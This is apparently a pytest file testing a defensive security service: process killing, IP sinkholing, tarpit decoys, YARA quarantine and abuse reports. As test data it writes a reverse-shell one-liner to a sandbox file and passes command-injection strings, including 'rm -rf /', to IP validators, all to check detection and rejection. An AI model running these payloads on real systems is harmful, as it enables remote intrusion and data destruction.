import subprocess
import sys
import time
import pytest
import psutil
from httpx import AsyncClient
from app.services.active_defense_service import active_defense_service
from app.services.file_scanner_service import file_scanner_service
from app.core.config import settings


def test_active_defense_malicious_process_kill_switch():
    # 1. Spawn a sacrificial child python process
    sub = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    pid = sub.pid
    assert psutil.pid_exists(pid) is True

    # 2. Engage Active Defense Kill Switch
    res = active_defense_service.kill_process(
        pid=pid,
        reason="Test Automated Malware Neutralization",
        force=True
    )
    assert res["success"] is True
    assert res["countermeasure"] == "PROCESS_KILL"
    assert res["target_pid"] == pid

    # 3. Verify process no longer exists
    time.sleep(0.2)
    assert psutil.pid_exists(pid) is False

    # 4. Verify logged in countermeasures ledger
    log = active_defense_service.get_countermeasures_history()
    assert any(entry["target_pid"] == pid for entry in log)


def test_active_defense_perimeter_sinkhole_lifecycle():
    test_ip = "198.51.100.99"
    active_defense_service.release_sinkhole(test_ip)

    # 1. Establish Sinkhole
    rec = active_defense_service.sinkhole_ip(
        ip=test_ip,
        reason="Attacker C2 probe null-routing",
        duration_seconds=3600
    )
    assert rec["ip"] == test_ip
    assert rec["duration_seconds"] == 3600

    # 2. Check sinkhole status
    is_sink, info = active_defense_service.is_ip_sinkholed(test_ip)
    assert is_sink is True
    assert info["ip"] == test_ip

    # 3. Release Sinkhole
    released = active_defense_service.release_sinkhole(test_ip)
    assert released is True
    is_sink_after, _ = active_defense_service.is_ip_sinkholed(test_ip)
    assert is_sink_after is False


def test_tarpit_deception_engine():
    trap_ip = "203.0.113.88"
    active_defense_service.add_tarpit_target(trap_ip, reason="Bot scanner tarpit")
    assert active_defense_service.is_tarpitted(trap_ip) is True

    decoy = active_defense_service.generate_tarpit_decoy("database_tool", "query_records")
    assert decoy["status"] == "success"
    assert "canary_tk_" in decoy["synthetic_telemetry"]["token_id"]

    active_defense_service.remove_tarpit_target(trap_ip)
    assert active_defense_service.is_tarpitted(trap_ip) is False


@pytest.mark.asyncio
async def test_yara_file_quarantine_and_purge():
    sandbox = settings.absolute_sandbox_path
    sandbox.mkdir(parents=True, exist_ok=True)
    test_malware_file = sandbox / "webshell_reverse.sh"
    test_malware_file.write_bytes(b"#!/bin/bash\n/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")

    # 1. Scan file using YARA heuristic engine
    scan_res = await file_scanner_service.scan_file(test_malware_file)
    assert scan_res["is_clean"] is False
    assert "ReverseShell" in scan_res["threat_name"]

    # 2. Quarantine file
    q_rec = await file_scanner_service.quarantine_file(test_malware_file, scan_res["threat_name"])
    assert test_malware_file.exists() is False  # Original file removed from sandbox
    q_id = q_rec["quarantine_id"]

    # 3. List quarantine
    vault = await file_scanner_service.list_quarantine()
    assert any(item["quarantine_id"] == q_id for item in vault)

    # 4. Restore file
    restored = await file_scanner_service.restore_quarantined_file(q_id)
    assert restored["is_restored"] is True
    assert test_malware_file.exists() is True

    # 5. Re-quarantine and purge
    q_rec2 = await file_scanner_service.quarantine_file(test_malware_file, scan_res["threat_name"])
    purged = await file_scanner_service.purge_quarantined_file(q_rec2["quarantine_id"])
    assert purged["is_purged"] is True


@pytest.mark.asyncio
async def test_active_defense_api_endpoints(client: AsyncClient):
    # 1. List processes
    proc_res = await client.get("/api/v1/active-defense/processes")
    assert proc_res.status_code == 200
    assert isinstance(proc_res.json(), list)

    # 2. Generate RFC abuse report
    abuse_res = await client.post(
        "/api/v1/active-defense/abuse-report",
        json={
            "ip": "198.51.100.12",
            "attack_vector": "Remote Tool Execution Exploit",
            "severity": "CRITICAL",
            "mitre_id": "T1059",
            "evidence_snippet": "Unauthorized subprocess shell command injection."
        }
    )
    assert abuse_res.status_code == 200
    data = abuse_res.json()
    assert "rfc_report" in data
    assert "soc-abuse@agenttrust.security" in data["rfc_report"]
    assert "198.51.100.12" in data["rfc_report"]


@pytest.mark.asyncio
async def test_gateway_enforces_active_defense_sinkhole(client: AsyncClient):
    # Register an agent
    reg = await client.post("/api/v1/agents", json={"name": "SinkholeVictimAgent", "role": "test"})
    ag_data = reg.json()
    api_key = ag_data["raw_api_key"]

    sinkhole_ip = "192.0.2.111"
    # Establish sinkhole on that IP
    active_defense_service.sinkhole_ip(sinkhole_ip, reason="Immediate containment")

    # Gateway execution from that IP should be rejected instantly
    res = await client.post(
        "/api/v1/gateway/execute",
        headers={
            "Authorization": f"Bearer {api_key}",
            "X-Forwarded-For": sinkhole_ip
        },
        json={
            "tool": "filesystem_tool",
            "operation": "read_file",
            "resource": "public/readme.txt"
        }
    )
    assert res.status_code == 403
    assert "Active Defense Perimeter Sinkhole" in res.json()["reason"]

    # Release sinkhole
    active_defense_service.release_sinkhole(sinkhole_ip)


def test_active_defense_cidr_subnet_sinkhole():
    subnet = "198.51.100.0/24"
    active_defense_service.sinkhole_ip(subnet, reason="Subnet probe containment")

    # Member of CIDR subnet should be sinkholed
    is_blocked, rec = active_defense_service.is_ip_sinkholed("198.51.100.42")
    assert is_blocked is True
    assert rec["ip"] == subnet

    # Non-member should not be sinkholed
    is_blocked_other, _ = active_defense_service.is_ip_sinkholed("198.51.101.42")
    assert is_blocked_other is False

    active_defense_service.release_sinkhole(subnet)


def test_active_defense_malformed_ip_rejection():
    with pytest.raises(ValueError, match="Invalid IP address or CIDR range"):
        active_defense_service.sinkhole_ip("1.2.3.4 & calc.exe")

    with pytest.raises(ValueError, match="Invalid IP address or CIDR range"):
        active_defense_service.sinkhole_ip("not_an_ip; rm -rf /")


def test_active_defense_protected_pid_rejection():
    import os
    # Backend server PID
    res_self = active_defense_service.kill_process(pid=os.getpid())
    assert res_self["success"] is False
    assert "Protected system or platform PID" in res_self["error"]

    # System PIDs (0, 1, 4)
    for sys_pid in [0, 1, 4]:
        res_sys = active_defense_service.kill_process(pid=sys_pid)
        assert res_sys["success"] is False
        assert "Protected" in res_sys["error"]


@pytest.mark.asyncio
async def test_gateway_enforces_deception_tarpit(client: AsyncClient):
    # Register test agent
    reg = await client.post("/api/v1/agents", json={"name": "TarpitProbeAgent", "role": "scanner"})
    ag_data = reg.json()
    api_key = ag_data["raw_api_key"]

    trap_ip = "203.0.113.99"
    active_defense_service.add_tarpit_target(trap_ip, reason="Automated tool probing")

    # Gateway execution from trap IP should return synthetic canary decoy
    res = await client.post(
        "/api/v1/gateway/execute",
        headers={
            "Authorization": f"Bearer {api_key}",
            "X-Forwarded-For": trap_ip
        },
        json={
            "tool": "postgres_tool",
            "operation": "query_select",
            "resource": "table:customer_records",
            "parameters": {"sql": "SELECT * FROM customer_records"}
        }
    )
    assert res.status_code == 200
    data = res.json()
    assert data["decision"] == "ALLOWED"
    assert "Deception Tarpit" in data["reason"]
    assert "canary_tk_" in data["result"]["synthetic_telemetry"]["token_id"]

    active_defense_service.remove_tarpit_target(trap_ip)


def test_endpoint_connector_process_and_ip_safety():
    import os
    import sys
    from pathlib import Path
    connector_dir = str(Path(__file__).resolve().parent.parent.parent / "endpoint-connector")
    if connector_dir not in sys.path:
        sys.path.insert(0, connector_dir)
    import connector
    endpoint_conn = connector.endpoint_connector

    # Refuses to kill self
    res_self = endpoint_conn.kill_process(os.getpid())
    assert res_self["success"] is False

    # Rejects malformed IP
    res_ip = endpoint_conn.block_remote_ip("invalid_ip && whoami")
    assert res_ip["success"] is False
